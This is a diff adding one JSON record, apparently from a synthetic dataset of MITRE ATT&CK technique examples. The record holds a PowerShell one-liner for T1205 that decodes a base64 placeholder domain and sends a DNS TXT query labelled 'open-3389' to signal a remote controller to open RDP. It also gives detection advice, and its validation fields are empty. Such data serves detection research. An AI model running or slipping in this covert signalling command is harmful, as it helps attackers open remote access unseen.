@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $name = 'open-3389.' + ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('ZXhhbXBsZS5jb20='))); Resolve-DnsName -Type TXT -Name $name -Server 8.8.8.8 -QuickTimeout | Out-Null }",
+  "explanation": "Issues a DNS TXT query containing a magic label ('open-3389.example.com') to signal a controller that it's time to open RDP externally. This is a covert signaling channel consistent with T1205. Detection: inspect DNS egress for unusual labels encoding actions; monitor high-entropy or directive-like subdomains. No elevation required; UAC not triggered.",
+  "rationale_steps": [
+    "Use DNS as a signaling side-channel with an action-encoded label.",
+    "Rely on a remote controller to react (e.g., adjust ACLs to open RDP).",
+    "Recommend DNS logging and analysis for directive-like patterns."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-1108f921-2a9e2b77",
+  "source_prompt_hash": "1108f921",
+  "timestamp_utc": "2025-09-30T05:58:00.779201Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
